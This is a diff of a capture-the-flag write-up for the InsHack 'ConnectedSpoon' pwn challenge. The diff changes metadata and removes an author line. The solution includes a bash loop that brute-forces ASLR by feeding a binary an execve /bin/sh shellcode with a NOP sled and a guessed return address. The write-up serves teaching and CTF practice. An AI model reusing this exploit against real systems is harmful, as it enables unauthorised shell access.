@@ -1,5 +1,5 @@
 ---
-title: "InsHack -- CrazyMinitel Writeup"
+title: "InsHack -- ConnectedSpoon Writeup"
 categories:
   - InsHack
 tags:
@@ -10,11 +10,11 @@ tags:
 > Mmmh my connected spoon has a strange behaviour, maybe a backdoor? Could you have a look?
 
 <div class="notice--info">
-<strong>Name</strong>: CrazyMinitel<br>
+<strong>Name</strong>: ConnectedSpoon<br>
 <strong>Category</strong>: pwn<br>
-<strong>Points</strong>: 125<br>
-<strong>Solves</strong>: 77<br>
-<strong>Given</strong>: <code>crazy-minitel</code><br> <!-- Link the files here to my repository with it -->
+<strong>Points</strong>: 150<br>
+<strong>Solves</strong>: 42<br>
+<strong>Given</strong>: <code>connected-spoon</code><br> <!-- Link the files here to my repository with it -->
 </div>
 
 
@@ -27,8 +27,6 @@ tags:
     ASLR:     ENABLED           (<- we CANNOT realiably know where the stack is)
 
 # Solution:
-**By:** Vasco Franco (jofra)
-
 This is very similar to crazy-minitel, so I will assume you have read that writeup, and just focus on what's new: `ASLR`!<br>
 One change from crazy-minitel is that we have a larger buffer, meaning we can have a bigger **nop sled**.<br><br>
 With that in mind, lets just bruteforce ASLR. From running the program in gdb what I found that:
@@ -38,7 +36,6 @@ With that in mind, lets just bruteforce ASLR. From running the program in gdb wh
 
 I launched this little script to bruteforce the ASLR, went to eat something, and when I got back I had a shell waiting for me. :)
 ```bash
-#!/bin/bash
 while :
 do
     ~/vuln $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'.rjust(1950, '\x90') + 'A'*(2012-1950) + '\xb0\xba\xad\xbf'")
